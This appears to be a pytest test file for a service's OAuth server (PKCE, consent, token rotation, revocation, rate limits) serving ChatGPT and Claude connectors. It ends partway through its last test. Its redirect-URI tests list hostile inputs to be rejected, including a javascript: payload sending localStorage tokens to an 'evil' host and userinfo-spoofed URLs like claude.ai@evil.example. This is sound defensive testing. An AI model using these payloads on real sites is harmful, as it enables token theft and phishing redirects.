"""OAuth for the MCP, end to end, the way ChatGPT and Claude connect (16 Oct 2026).

services/oauth.py has the reasons. What has to hold: the metadata the two
clients read (RFC 8414 and 9728, PKCE S256, a public client's `none`,
`offline_access`); registration; /authorize parks a request and sends the
browser to the dashboard's consent; only a signed-in person answers it, for a
project of their own account and never more than was asked; the code is
single use and PKCE-checked; the access token is a Korely key of that project
with those scopes; a refresh renews the same key row and rotates; a revoked
key ends the grant; the expiry warnings leave these keys alone.

And what the review of the branch found (16 Oct 2026): a return address the
browser would run (`javascript:`) is refused at registration; `iss` is the
metadata's issuer to the character; a code or refresh token raced twice gives
one key; one presented after its use revokes the key; a narrower refresh
narrows the key; an archived project takes no app; no SECRET_KEY is a 400,
not a 500; spent grants and idle clients are purged; the trail has the yes,
the key and its revocation.
"""
import base64
import hashlib
import secrets
import uuid
from urllib.parse import parse_qs, urlparse

import pytest

from korely_agent.db.models import AgentApiKey, AuditEvent, OAuthClient, OAuthGrant
from korely_agent.services import keys as key_service
from korely_agent.services import operators as operator_service
from korely_agent.services import projects as projects_service


REDIRECT = "https://chatgpt.com/connector/oauth/abc123"


@pytest.fixture
def client(db, monkeypatch):
    from fastapi.testclient import TestClient
    from korely_agent import config
    from korely_agent.db import get_db
    from korely_agent.main import create_app

    from korely_agent.mcp import server as mcp_server

    monkeypatch.setenv("RUN_WORKER", "false")
    monkeypatch.setenv("PUBLIC_BASE_URL", "https://memory.example")
    # The MCP server is built once per process, at the first app: built
    # again here, with this test's address.
    monkeypatch.setattr(mcp_server, "_agent_mcp_singleton", None)
    monkeypatch.setattr(mcp_server, "_agent_streamable_app_singleton", None)
    config.get_settings.cache_clear()
    try:
        app = create_app()
        app.dependency_overrides[get_db] = lambda: db
        with TestClient(app, base_url="https://memory.example") as c:
            yield c
        app.dependency_overrides.clear()
    finally:
        config.get_settings.cache_clear()


@pytest.fixture
def session(db, tenant):
    op, _pw = operator_service.create(db, tenant_id=tenant.id, username=f"op-{uuid.uuid4().hex[:6]}")
    _row, raw = operator_service.open_session(db, op)
    return {"Authorization": f"Bearer {raw}"}


def _pkce():
    verifier = secrets.token_urlsafe(48)
    challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b"=").decode()
    return verifier, challenge


def _register(client):
    r = client.post("/register", json={"client_name": "ChatGPT", "redirect_uris": [REDIRECT],
                                       "token_endpoint_auth_method": "none",
                                       "grant_types": ["authorization_code", "refresh_token"],
                                       "response_types": ["code"]})
    assert r.status_code == 201, r.text
    return r.json()["client_id"]


def _authorize(client, cid, challenge, scope="memories:read memories:write offline_access",
               resource="https://memory.example/mcp"):
    return client.get("/authorize", params={
        "response_type": "code", "client_id": cid, "redirect_uri": REDIRECT,
        "code_challenge": challenge, "code_challenge_method": "S256", "state": "st-1",
        "scope": scope, "resource": resource}, follow_redirects=False)


def _connect(client, db, tenant, session, *, scopes=("memories:read",)):
    """The whole dance; returns (token reply, client id)."""
    cid = _register(client)
    verifier, challenge = _pkce()
    r = _authorize(client, cid, challenge)
    assert r.status_code in (302, 307), r.text
    consent = urlparse(r.headers["location"])
    assert consent.path == "/oauth/consent"
    request_id = parse_qs(consent.query)["request"][0]
    project = projects_service.get_or_create_default_project(db, tenant.id)
    shown = client.get(f"/admin/oauth/requests/{request_id}", headers=session)
    assert shown.status_code == 200 and shown.json()["client_name"] == "ChatGPT"
    ok = client.post(f"/admin/oauth/requests/{request_id}/approve", headers=session,
                     json={"project_id": str(project.id), "scopes": list(scopes)})
    assert ok.status_code == 200, ok.text
    back = urlparse(ok.json()["redirect"])
    q = parse_qs(back.query)
    assert back.netloc == "chatgpt.com" and q["state"] == ["st-1"]
    # RFC 9207: compared as strings with the metadata's issuer.
    assert q["iss"] == [client.get("/.well-known/oauth-authorization-server").json()["issuer"]]
    t = client.post("/token", data={"grant_type": "authorization_code", "code": q["code"][0],
                                    "client_id": cid, "redirect_uri": REDIRECT,
                                    "code_verifier": verifier})
    assert t.status_code == 200, t.text
    return t.json(), cid, q["code"][0], verifier


def _refresh(client, cid, token, scope=None):
    data = {"grant_type": "refresh_token", "refresh_token": token, "client_id": cid}
    if scope:
        data["scope"] = scope
    return client.post("/token", data=data)


def _dead(db, access) -> bool:
    db.expire_all()
    return key_service.verify_api_key(db, access) is None


def test_the_metadata_chatgpt_and_claude_read(client):
    m = client.get("/.well-known/oauth-authorization-server").json()
    assert m["issuer"].rstrip("/") == "https://memory.example"
    assert m["authorization_endpoint"] == "https://memory.example/authorize"
    assert m["code_challenge_methods_supported"] == ["S256"]
    assert "none" in m["token_endpoint_auth_methods_supported"]
    assert "offline_access" in m["scopes_supported"]
    assert m["registration_endpoint"] == "https://memory.example/register"
    prm = client.get("/.well-known/oauth-protected-resource/mcp").json()
    assert [a.rstrip("/") for a in prm["authorization_servers"]] == ["https://memory.example"]


def test_the_whole_dance_gives_a_key_of_the_project(client, db, tenant, session):
    tok, cid, _code, _v = _connect(client, db, tenant, session, scopes=("memories:read",))
    assert tok["token_type"].lower() == "bearer" and tok["expires_in"] == 3600
    assert tok["refresh_token"]
    row = key_service.verify_api_key(db, tok["access_token"])
    assert row is not None and row.oauth_client_id == cid
    assert row.scopes == ["memories:read"]  # never more than the person chose
    assert "via OAuth" in row.name
    head = {"Authorization": f"Bearer {tok['access_token']}"}
    assert client.get("/v1/ping", headers=head).status_code == 200
    assert client.post("/v1/memories", headers=head, json={"content": "x"}).status_code == 403


def test_a_code_is_single_use_and_pkce_checked(client, db, tenant, session):
    _tok, cid, code, verifier = _connect(client, db, tenant, session)
    again = client.post("/token", data={"grant_type": "authorization_code", "code": code,
                                        "client_id": cid, "redirect_uri": REDIRECT,
                                        "code_verifier": verifier})
    assert again.status_code == 400


def test_a_refresh_renews_the_same_key_and_rotates(client, db, tenant, session):
    tok, cid, _c, _v = _connect(client, db, tenant, session, scopes=("memories:read", "memories:write"))
    r = client.post("/token", data={"grant_type": "refresh_token", "refresh_token": tok["refresh_token"],
                                    "client_id": cid})
    assert r.status_code == 200, r.text
    new = r.json()
    assert key_service.verify_api_key(db, tok["access_token"]) is None   # the old secret is dead
    db.expire_all()
    assert key_service.verify_api_key(db, new["access_token"]) is not None
    assert db.query(AgentApiKey).filter(AgentApiKey.oauth_client_id == cid).count() == 1
    reused = client.post("/token", data={"grant_type": "refresh_token",
                                         "refresh_token": tok["refresh_token"], "client_id": cid})
    assert reused.status_code == 400  # rotation: a refresh token works once


def test_revoking_the_key_ends_the_grant(client, db, tenant, session):
    tok, cid, _c, _v = _connect(client, db, tenant, session)
    row = key_service.verify_api_key(db, tok["access_token"])
    row.revoked_at = row.created_at
    db.commit()
    r = client.post("/token", data={"grant_type": "refresh_token", "refresh_token": tok["refresh_token"],
                                    "client_id": cid})
    assert r.status_code == 400


def test_only_a_person_answers_the_consent(client, db, tenant, session):
    cid = _register(client)
    _v, challenge = _pkce()
    request_id = parse_qs(urlparse(_authorize(client, cid, challenge).headers["location"]).query)["request"][0]
    _row, key = key_service.create_api_key(db, tenant_id=tenant.id, name="admin-k",
                                           scopes=["memories:read", "memories:write", "admin"])
    r = client.get(f"/admin/oauth/requests/{request_id}", headers={"Authorization": f"Bearer {key}"})
    assert r.status_code == 403


def test_a_project_of_another_account_is_refused(client, db, tenant, session):
    from korely_agent.db.models import Tenant

    other = Tenant(id=uuid.uuid4(), name="Other")
    db.add(other)
    db.commit()
    theirs = projects_service.get_or_create_default_project(db, other.id)
    cid = _register(client)
    _v, challenge = _pkce()
    request_id = parse_qs(urlparse(_authorize(client, cid, challenge).headers["location"]).query)["request"][0]
    r = client.post(f"/admin/oauth/requests/{request_id}/approve", headers=session,
                    json={"project_id": str(theirs.id), "scopes": ["memories:read"]})
    # 404, as every /admin route answers another account's project (audit of
    # 17 Oct 2026: it was a 409, and a malformed id a 422).
    assert r.status_code == 404
    malformed = client.post(f"/admin/oauth/requests/{request_id}/approve", headers=session,
                            json={"project_id": "not-a-uuid", "scopes": ["memories:read"]})
    assert malformed.status_code == 404


def test_a_token_for_another_resource_is_never_minted(client, db, tenant, session):
    cid = _register(client)
    _v, challenge = _pkce()
    r = _authorize(client, cid, challenge, resource="https://elsewhere.example/mcp")
    # Answered here, never sent to the app's address (RFC 9700 4.11.2).
    assert r.status_code == 400 and "location" not in r.headers
    assert r.json()["error"] == "invalid_request"


def test_deny_sends_access_denied_back(client, db, tenant, session):
    cid = _register(client)
    _v, challenge = _pkce()
    request_id = parse_qs(urlparse(_authorize(client, cid, challenge).headers["location"]).query)["request"][0]
    r = client.post(f"/admin/oauth/requests/{request_id}/deny", headers=session)
    assert "error=access_denied" in r.json()["redirect"] and "state=st-1" in r.json()["redirect"]


def test_the_expiry_warnings_leave_oauth_keys_alone(client, db, tenant, session):
    _tok, cid, _c, _v = _connect(client, db, tenant, session)
    out = key_service.warn_about_expiring(db)
    row = db.query(AgentApiKey).filter(AgentApiKey.oauth_client_id == cid).one()
    assert row.expiry_warned_at is None
    assert isinstance(out, dict)


def test_only_safe_return_addresses():
    from korely_agent.services.oauth import redirect_allowed

    for ok in ("https://chatgpt.com/connector/oauth/x", "https://claude.ai/api/mcp/auth_callback",
               "http://127.0.0.1:33418/cb", "http://localhost:6274/cb", "http://[::1]:8080/cb",
               "com.example.app:/oauth2redirect"):
        assert redirect_allowed(ok), ok
    for bad in ("javascript:fetch('//evil/'+localStorage.token)//", "data:text/html,<script>x</script>",
                "http://evil.example/cb", "vbscript:x", "https:///nohost", "",
                "https://claude.ai@evil.example/cb", "https://claude.ai:x@evil.example/cb",
                "http://localhost@evil.example/cb"):
        assert not redirect_allowed(bad), bad


def test_the_consent_names_the_host_the_answer_goes_to(client, db, tenant, session):
    """`https://claude.ai@evil.example/cb` was registered, and the consent
    page said the answer went back to "claude.ai@evil.example" while the
    code went to evil.example (audit of 19 Oct 2026). A request stored
    with such an address before shows the real host and cannot be approved."""
    from korely_agent.db.models import OAuthGrant

    cid = _register(client)
    _verifier, challenge = _pkce()
    consent = urlparse(_authorize(client, cid, challenge).headers["location"])
    request_id = parse_qs(consent.query)["request"][0]
    db.query(OAuthGrant).filter(OAuthGrant.id == uuid.UUID(request_id)).update(
        {OAuthGrant.redirect_uri: "https://claude.ai@evil.example/cb"})
    db.commit()
    shown = client.get(f"/admin/oauth/requests/{request_id}", headers=session)
    assert shown.json()["redirect_host"] == "evil.example", shown.json()
    project = projects_service.get_or_create_default_project(db, tenant.id)
    ok = client.post(f"/admin/oauth/requests/{request_id}/approve", headers=session,
                     json={"project_id": str(project.id), "scopes": ["memories:read"]})
    assert ok.status_code != 200, ok.text
    r = client.post("/register", json={"client_name": "Claude",
                                       "redirect_uris": ["https://claude.ai@evil.example/cb"],
                                       "token_endpoint_auth_method": "none",
                                       "grant_types": ["authorization_code"],
                                       "response_types": ["code"]})
    assert r.status_code == 400, r.text


def test_a_return_address_the_browser_would_run_is_refused(client, db):
    for uri in ("javascript:fetch('//evil/'+localStorage.token)//", "http://evil.example/cb"):
        r = client.post("/register", json={"client_name": "x", "redirect_uris": [uri],
                                           "token_endpoint_auth_method": "none",
                                           "grant_types": ["authorization_code", "refresh_token"],
                                           "response_types": ["code"]})
        assert r.status_code == 400, (uri, r.text)
    assert db.query(OAuthClient).count() == 0


def test_no_secret_key_is_a_400_not_a_500(client, monkeypatch):
    from korely_agent.services import provider_key

    def no_key(_raw):
        raise provider_key.NoEncryptionKey("no SECRET_KEY")

    monkeypatch.setattr(provider_key, "encrypt_secret", no_key)
    r = client.post("/register", json={"client_name": "x", "redirect_uris": [REDIRECT],
                                       "token_endpoint_auth_method": "client_secret_post",
                                       "grant_types": ["authorization_code", "refresh_token"],
                                       "response_types": ["code"]})
    assert r.status_code == 400 and r.json()["error"] == "invalid_client_metadata"


def test_a_code_raced_twice_gives_one_key(client, db, tenant, session):
    from mcp.server.auth.provider import TokenError

    from korely_agent.api import oauth as oauth_api

    cid = _register(client)
    _v, challenge = _pkce()
    request_id = parse_qs(urlparse(_authorize(client, cid, challenge).headers["location"]).query)["request"][0]
    project = projects_service.get_or_create_default_project(db, tenant.id)
    ok = client.post(f"/admin/oauth/requests/{request_id}/approve", headers=session,
                     json={"project_id": str(project.id), "scopes": ["memories:read"]})
    code = parse_qs(urlparse(ok.json()["redirect"]).query)["code"][0]
    provider = oauth_api.provider()
    info = provider._get_client(cid)
    # Both loaded before either spends it: the two requests of a race.
    first, second = provider._load_code(info, code), provider._load_code(info, code)
    provider._exchange_code(info, first)
    with pytest.raises(TokenError):
        provider._exchange_code(info, second)
    assert db.query(AgentApiKey).filter(AgentApiKey.oauth_client_id == cid).count() == 1


def test_a_refresh_token_presented_again_revokes_the_key(client, db, tenant, session):
    tok, cid, _c, _v = _connect(client, db, tenant, session)
    new = _refresh(client, cid, tok["refresh_token"]).json()
    assert not _dead(db, new["access_token"])
    assert _refresh(client, cid, tok["refresh_token"]).status_code == 400   # the copy
    assert _dead(db, new["access_token"])                                    # the key is gone
    assert _refresh(client, cid, new["refresh_token"]).status_code == 400   # and the chain


def test_a_code_presented_again_revokes_the_key(client, db, tenant, session):
    tok, cid, code, verifier = _connect(client, db, tenant, session)
    again = client.post("/token", data={"grant_type": "authorization_code", "code": code,
                                        "client_id": cid, "redirect_uri": REDIRECT,
                                        "code_verifier": verifier})
    assert again.status_code == 400
    assert _dead(db, tok["access_token"])


def test_a_narrower_refresh_narrows_the_key_not_the_grant(client, db, tenant, session):
    tok, cid, _c, _v = _connect(client, db, tenant, session, scopes=("memories:read", "memories:write"))
    narrow = _refresh(client, cid, tok["refresh_token"], scope="memories:read")
    assert narrow.status_code == 200 and narrow.json()["scope"] == "memories:read"
    db.expire_all()
    assert key_service.verify_api_key(db, narrow.json()["access_token"]).scopes == ["memories:read"]
    wide = _refresh(client, cid, narrow.json()["refresh_token"])   # RFC 6749 section 6
    assert wide.status_code == 200, wide.text
    db.expire_all()
    assert key_service.verify_api_key(db, wide.json()["access_token"]).scopes == ["memories:read",
                                                                                   "memories:write"]


def test_an_archived_project_takes_no_app(client, db, tenant, session):
    from datetime import datetime, timezone

    tok, cid, _c, _v = _connect(client, db, tenant, session)
    project = projects_service.create_project(db, tenant_id=tenant.id, name="Hidden")
    project.archived_at = datetime.now(timezone.utc)
    db.commit()
    cid2 = _register(client)
    _v2, challenge = _pkce()
    request_id = parse_qs(urlparse(_authorize(client, cid2, challenge).headers["location"]).query)["request"][0]
    r = client.post(f"/admin/oauth/requests/{request_id}/approve", headers=session,
                    json={"project_id": str(project.id), "scopes": ["memories:read"]})
    assert r.status_code == 409 and r.json()["code"] == "project_archived"
    # The app already connected: its project archived, the refresh is refused.
    row = key_service.verify_api_key(db, tok["access_token"])
    row.project_id = project.id
    db.commit()
    assert _refresh(client, cid, tok["refresh_token"]).status_code == 400


def _revoke(client, cid, token):
    # The SDK's RevocationRequest (1.30) wants the field there even for a
    # public client, whose secret is empty.
    return client.post("/revoke", data={"token": token, "client_id": cid, "client_secret": ""})


def test_the_app_disconnecting_ends_the_grant(client, db, tenant, session):
    tok, cid, _c, _v = _connect(client, db, tenant, session)
    r = _revoke(client, cid, tok["refresh_token"])
    assert r.status_code == 200, r.text
    assert _dead(db, tok["access_token"])


def test_the_trail_has_the_yes_the_key_and_its_end(client, db, tenant, session):
    tok, cid, _c, _v = _connect(client, db, tenant, session)
    _revoke(client, cid, tok["refresh_token"])
    db.expire_all()
    rows = db.query(AuditEvent).filter(AuditEvent.tenant_id == tenant.id).all()
    seen = {(r.action, r.actor) for r in rows}
    assert ("setting_change", "dashboard") in seen
    assert ("key_create", "oauth") in seen and ("key_revoke", "oauth") in seen
    created = next(r for r in rows if r.action == "key_create")
    assert created.meta["oauth_client"] == cid


def test_a_challenge_longer_than_pkce_makes_is_refused(client, db):
    cid = _register(client)
    r = _authorize(client, cid, "x" * 200)
    assert r.status_code == 400 and "location" not in r.headers
    assert r.json()["error"] == "invalid_request"


def test_spent_grants_and_idle_clients_are_purged(client, db, tenant, session):
    from datetime import datetime, timedelta, timezone

    from korely_agent.services import oauth as oauth_service

    _tok, cid, _c, _v = _connect(client, db, tenant, session)   # a client in use stays
    idle = _register(client)
    old = datetime.now(timezone.utc) - timedelta(days=2)
    db.query(OAuthClient).filter(OAuthClient.client_id == idle).update({"created_at": old})
    db.query(OAuthGrant).filter(OAuthGrant.client_id == cid, OAuthGrant.kind != "refresh").update(
        {"used_at": old})
    db.commit()
    assert oauth_service.purge_expired(db) >= 3   # the request, the code, the idle client
    db.expire_all()
    assert db.get(OAuthClient, idle) is None and db.get(OAuthClient, cid) is not None
    assert db.query(OAuthGrant).filter(OAuthGrant.client_id == cid).count() == 1   # the refresh


def test_a_network_is_kept_only_for_the_hour_that_counts_it(client, db):
    """The network of a registration and of a request serves the hourly
    limit and nothing else: past the hour the worker clears it (audit of
    17 Oct 2026: it stayed as long as the client did)."""
    from datetime import datetime, timedelta, timezone

    from korely_agent.services import oauth as oauth_service

    old = _register(client)
    _v, challenge = _pkce()
    assert _authorize(client, old, challenge).status_code in (302, 307)
    new = _register(client)
    two_hours = datetime.now(timezone.utc) - timedelta(hours=2)
    db.query(OAuthClient).filter(OAuthClient.client_id == old).update({"created_at": two_hours})
    db.query(OAuthGrant).filter(OAuthGrant.client_id == old).update({"created_at": two_hours})
    db.commit()
    oauth_service.purge_expired(db)
    db.expire_all()
    assert db.get(OAuthClient, old).network is None
    assert db.query(OAuthGrant).filter(OAuthGrant.client_id == old,
                                       OAuthGrant.network.isnot(None)).count() == 0
    assert db.get(OAuthClient, new).network is not None   # still in its hour


def test_an_app_revoked_in_api_keys_leaves_with_its_client(client, db, tenant, session):
    """A revoked key stays as a row; it no longer holds its client (and the
    client's metadata) for as long as the account exists."""
    from datetime import datetime, timedelta, timezone

    from korely_agent.services import oauth as oauth_service

    tok, cid, _c, _v = _connect(client, db, tenant, session)
    row = key_service.verify_api_key(db, tok["access_token"])
    kid = row.id
    assert client.post(f"/admin/keys/{kid}/revoke", headers=session).status_code == 200
    two_days = datetime.now(timezone.utc) - timedelta(days=2)
    db.query(OAuthClient).filter(OAuthClient.client_id == cid).update({"created_at": two_days})
    # The request and the code it answered, spent at the connection.
    db.query(OAuthGrant).filter(OAuthGrant.client_id == cid, OAuthGrant.kind != "refresh").update(
        {"used_at": two_days})
    db.commit()
    oauth_service.purge_expired(db)
    db.expire_all()
    assert db.get(OAuthClient, cid) is None
    assert db.query(OAuthGrant).filter(OAuthGrant.client_id == cid).count() == 0
    kept = db.get(AgentApiKey, kid)
    assert kept is not None and kept.revoked_at is not None and kept.oauth_client_id is None


def test_an_app_that_stopped_renewing_is_disconnected(client, db, tenant, session):
    """A key that expired a day ago with no refresh token left can never
    work again: the worker revokes it, as the app's disconnection would, and
    the client goes. One that expired an hour ago and can renew stays."""
    from datetime import datetime, timedelta, timezone

    from korely_agent.services import oauth as oauth_service

    gone_tok, gone, _c, _v = _connect(client, db, tenant, session)
    kept_tok, kept, _c2, _v2 = _connect(client, db, tenant, session)
    now = datetime.now(timezone.utc)
    gone_key = key_service.verify_api_key(db, gone_tok["access_token"]).id
    kept_key = key_service.verify_api_key(db, kept_tok["access_token"]).id
    db.query(OAuthClient).filter(OAuthClient.client_id.in_([gone, kept])).update(
        {"created_at": now - timedelta(days=100)}, synchronize_session=False)
    db.query(AgentApiKey).filter(AgentApiKey.id == gone_key).update(
        {"expires_at": now - timedelta(days=2)})
    db.query(AgentApiKey).filter(AgentApiKey.id == kept_key).update(
        {"expires_at": now - timedelta(hours=1)})
    db.query(OAuthGrant).filter(OAuthGrant.client_id == gone, OAuthGrant.kind == "refresh").update(
        {"expires_at": now - timedelta(hours=1)})
    db.query(OAuthGrant).filter(OAuthGrant.client_id.in_([gone, kept]), OAuthGrant.kind != "refresh").update(
        {"used_at": now - timedelta(days=100)}, synchronize_session=False)
    db.commit()
    oauth_service.purge_expired(db)
    db.expire_all()
    assert db.get(OAuthClient, gone) is None and db.get(AgentApiKey, gone_key).revoked_at is not None
    assert db.get(OAuthClient, kept) is not None and db.get(AgentApiKey, kept_key).revoked_at is None
    assert _refresh(client, kept, kept_tok["refresh_token"]).status_code == 200
    ended = db.query(AuditEvent).filter(AuditEvent.action == "key_revoke",
                                        AuditEvent.target_id == str(gone_key)).one()
    assert ended.actor == "oauth" and ended.meta["reason"] == "the app did not renew it"


def test_a_network_past_its_hour_is_refused(client, db, monkeypatch):
    """/register and /authorize answer anyone: past the hour's allowance of
    one network, a 429 (a choice of 16 Oct 2026, in the service)."""
    from korely_agent.services import oauth as oauth_service

    monkeypatch.setitem(oauth_service.PER_HOUR, "client", 2)
    monkeypatch.setitem(oauth_service.PER_HOUR, "request", 2)
    cid = _register(client)
    _register(client)
    third = client.post("/register", json={"client_name": "x", "redirect_uris": [REDIRECT],
                                           "token_endpoint_auth_method": "none",
                                           "grant_types": ["authorization_code", "refresh_token"],
                                           "response_types": ["code"]})
    assert third.status_code == 429 and third.headers["retry-after"] == "3600"
    # The window it counts over, never a copy of it (audit of 17 Oct 2026).
    from datetime import timedelta
    monkeypatch.setattr(oauth_service, "NETWORK_WINDOW", timedelta(minutes=30))
    again = client.post("/register", json={"client_name": "x", "redirect_uris": [REDIRECT],
                                           "token_endpoint_auth_method": "none",
                                           "grant_types": ["authorization_code", "refresh_token"],
                                           "response_types": ["code"]})
    assert again.status_code == 429 and again.headers["retry-after"] == "1800"
    assert db.query(OAuthClient).count() == 2
    assert db.query(OAuthClient).filter(OAuthClient.network.isnot(None)).count() == 2
    _v, challenge = _pkce()
    assert _authorize(client, cid, challenge).status_code in (302, 307)
    assert _authorize(client, cid, challenge).status_code in (302, 307)
    assert _authorize(client, cid, challenge).status_code == 429


def test_a_burst_from_one_network_stops_at_its_allowance(client, db, monkeypatch):
    """The allowance counted the rows, then the SDK inserted, in another
    session: requests in flight together all read the same count, and forty
    concurrent /register from one address wrote forty clients past a cap of
    twenty (audit of 18 Oct 2026). The count that decides is taken
    again at the insert, under a lock: a burst writes at most the cap, and the
    rest are refused."""
    import asyncio

    import httpx

    from korely_agent.services import oauth as oauth_service

    monkeypatch.setitem(oauth_service.PER_HOUR, "client", 3)
    monkeypatch.setitem(oauth_service.PER_HOUR, "request", 3)
    # The early count lets the whole burst through, as it did concurrently:
    # what is measured is the count at the insert.
    monkeypatch.setattr(oauth_service, "too_many", lambda kind, network: False)
    cid = _register(client)
    db.query(OAuthClient).update({"network": None})
    db.commit()
    _v, challenge = _pkce()
    body = {"client_name": "x", "redirect_uris": [REDIRECT], "token_endpoint_auth_method": "none",
            "grant_types": ["authorization_code", "refresh_token"], "response_types": ["code"]}
    params = {"response_type": "code", "client_id": cid, "redirect_uri": REDIRECT,
              "code_challenge": challenge, "code_challenge_method": "S256", "state": "st-1",
              "scope": "memories:read offline_access", "resource": "https://memory.example/mcp"}

    async def burst():
        transport = httpx.ASGITransport(app=client.app, client=("203.0.113.8", 4242))
        async with httpx.AsyncClient(transport=transport, base_url="https://memory.example") as c:
            reg = await asyncio.gather(*(c.post("/register", json=body) for _ in range(10)))
            auth = await asyncio.gather(*(c.get("/authorize", params=params) for _ in range(10)))
        return [r.status_code for r in reg], auth

    reg, auth = asyncio.run(burst())
    assert sorted(reg) == [201] * 3 + [429] * 7, reg
    assert db.query(OAuthClient).filter(OAuthClient.network.isnot(None)).count() == 3
    # Past the allowance at the insert, /authorize answers the SDK's error
    # here, never at the app's address (RFC 9700 4.11.2): only the consent
    # page is a redirect.
    sent = [parse_qs(urlparse(r.headers["location"]).query) for r in auth if r.status_code == 302]
    assert len(sent) == 3 and all("request" in q for q in sent)
    refused = [r for r in auth if r.status_code != 302]
    assert [(r.status_code, r.json()["error"]) for r in refused] == \
        [(400, "temporarily_unavailable")] * 7
    assert db.query(OAuthGrant).filter(OAuthGrant.kind == "request",
                                       OAuthGrant.network.isnot(None)).count() == 3


def test_a_get_on_the_oauth_doors_is_not_the_dashboard(client):
    for path in ("/token", "/register", "/revoke"):
        r = client.get(path)
        assert r.status_code in (404, 405), (path, r.status_code)
        assert "<html" not in r.text.lower()


def test_an_app_confined_at_consent_gets_a_confined_key(client, db, tenant, session):
    """The person may limit the app to some end users of the project
    (services/user_scope.py): the key it receives carries the list, and a
    renewal keeps it."""
    cid = _register(client)
    verifier, challenge = _pkce()
    request_id = parse_qs(urlparse(_authorize(client, cid, challenge).headers["location"]).query)["request"][0]
    project = projects_service.get_or_create_default_project(db, tenant.id)
    bad = client.post(f"/admin/oauth/requests/{request_id}/approve", headers=session,
                      json={"project_id": str(project.id), "scopes": ["memories:read"], "users": ["*"]})
    assert bad.status_code == 422, "end users a key cannot hold, as POST /admin/keys refuses them"
    none = client.post(f"/admin/oauth/requests/{request_id}/approve", headers=session,
                       json={"project_id": str(project.id), "scopes": []})
    assert none.status_code == 422, "no permission chosen is the answer refused, not the request"
    request_id = parse_qs(urlparse(_authorize(client, cid, challenge).headers["location"]).query)["request"][0]
    ok = client.post(f"/admin/oauth/requests/{request_id}/approve", headers=session,
                     json={"project_id": str(project.id), "scopes": ["memories:read"],
                           "users": ["founder", "repo:*"]})
    code = parse_qs(urlparse(ok.json()["redirect"]).query)["code"][0]
    tok = client.post("/token", data={"grant_type": "authorization_code", "code": code,
                                      "client_id": cid, "redirect_uri": REDIRECT,
                                      "code_verifier": verifier}).json()
    assert key_service.verify_api_key(db, tok["access_token"]).end_users == ["founder", "repo:*"]
    new = _refresh(client, cid, tok["refresh_token"]).json()
    db.expire_all()
    assert key_service.verify_api_key(db, new["access_token"]).end_users == ["founder", "repo:*"]
    head = {"Authorization": f"Bearer {new['access_token']}"}
    assert client.get("/v1/memories?user_id=private", headers=head).status_code == 403


def test_a_registration_keeps_only_what_an_app_needs(client, db):
    """Open to anyone, and the hourly limit counts rows: one 4 MB redirect URI
    was kept whole (audit of 17 Oct 2026)."""
    base = {"client_name": "x", "token_endpoint_auth_method": "none",
            "grant_types": ["authorization_code", "refresh_token"], "response_types": ["code"]}
    for uris in (["https://app.example/" + "a" * 3000],
                 [f"https://app.example/cb{i}" for i in range(6)]):
        r = client.post("/register", json={**base, "redirect_uris": uris})
        assert r.status_code == 400, r.text
    r = client.post("/register", json={**base, "client_name": "x" * 9000, "redirect_uris": [REDIRECT]})
    assert r.status_code == 400, r.text
    assert db.query(OAuthClient).count() == 0


def test_a_connection_request_keeps_no_long_state(client, db):
    cid = _register(client)
    _verifier, challenge = _pkce()
    r = client.get("/authorize", params={
        "response_type": "code", "client_id": cid, "redirect_uri": REDIRECT,
        "code_challenge": challenge, "code_challenge_method": "S256", "state": "s" * 5000,
        "scope": "memories:read", "resource": "https://memory.example/mcp"}, follow_redirects=False)
    assert r.status_code in (302, 307, 400)
    if r.status_code != 400:
        assert "error=invalid_request" in r.headers["location"]
    assert db.query(OAuthGrant).count() == 0


def test_deleting_its_project_disconnects_an_app(client, db, tenant, session):
    """The app's key moved with the project's keys into Default, where it read
    and wrote memories it was never allowed to (audit of 17 Oct 2026)."""
    tok, _cid, _c, _v = _connect(client, db, tenant, session, scopes=("memories:read",
                                                                      "memories:write"))
    scoped = projects_service.create_project(db, tenant_id=tenant.id, name="Scoped")
    row = key_service.verify_api_key(db, tok["access_token"])
    row.project_id = scoped.id  # as a consent to Scoped leaves it
    db.commit()
    app = {"Authorization": f"Bearer {tok['access_token']}"}
    assert client.post(f"/admin/keys/{row.id}/move", headers=session,
                       json={"project_id": None}).json()["code"] == "connected_app_key"
    r = client.delete(f"/admin/projects/{scoped.id}", headers=session)
    assert r.status_code == 200 and r.json()["apps_disconnected"] == 1, r.text
    assert client.get("/v1/memories", headers=app).status_code == 401
    db.expire_all()
    assert key_service.verify_api_key(db, tok["access_token"]) is None


def _a_code(client, db, tenant, session, users=None):
    """The dance up to the code, approved and not yet exchanged; returns
    (client id, code, verifier)."""
    cid = _register(client)
    verifier, challenge = _pkce()
    r = _authorize(client, cid, challenge)
    request_id = parse_qs(urlparse(r.headers["location"]).query)["request"][0]
    project = projects_service.get_or_create_default_project(db, tenant.id)
    body = {"project_id": str(project.id), "scopes": ["memories:read"]}
    if users is not None:
        body["users"] = users
    ok = client.post(f"/admin/oauth/requests/{request_id}/approve", headers=session, json=body)
    assert ok.status_code == 200, ok.text
    return cid, parse_qs(urlparse(ok.json()["redirect"]).query)["code"][0], verifier


def test_a_consent_refuses_a_line_break_in_its_end_users(client, db, tenant, session):
    """From 1.0.15 a key's end users refuse a Unicode line break (U+2028,
    U+2029) as they refused the control characters, and so does the
    consent, where the person names them: a 422, the request still open."""
    cid = _register(client)
    _verifier, challenge = _pkce()
    request_id = parse_qs(urlparse(_authorize(client, cid, challenge).headers["location"]).query)["request"][0]
    project = projects_service.get_or_create_default_project(db, tenant.id)
    for lb in ("a\u2028b", "a\u2029b"):
        r = client.post(f"/admin/oauth/requests/{request_id}/approve", headers=session,
                        json={"project_id": str(project.id), "scopes": ["memories:read"],
                              "users": [lb]})
        assert r.status_code == 422 and "line break" in r.json()["detail"], r.text
    ok = client.post(f"/admin/oauth/requests/{request_id}/approve", headers=session,
                     json={"project_id": str(project.id), "scopes": ["memories:read"]})
    assert ok.status_code == 200, ok.text


def test_a_code_whose_list_a_key_can_no_longer_hold_is_spent_with_invalid_grant(
        client, db, tenant, session):
    """A code approved before the upgrade, its list holding an id with a
    line break (as 1.0.13 stored it), exchanged after: the key is refused,
    as POST /admin/keys refuses it, so the code is spent and the app told
    to connect again (invalid_grant), never a 500 at every try until the
    code expires; no key is made."""
    cid, code, verifier = _a_code(client, db, tenant, session, users=["founder"])
    g = db.query(OAuthGrant).filter(OAuthGrant.kind == "code", OAuthGrant.used_at.is_(None)).one()
    g.end_users = ["a\u2028b", "founder"]
    db.commit()
    keys = db.query(AgentApiKey).count()
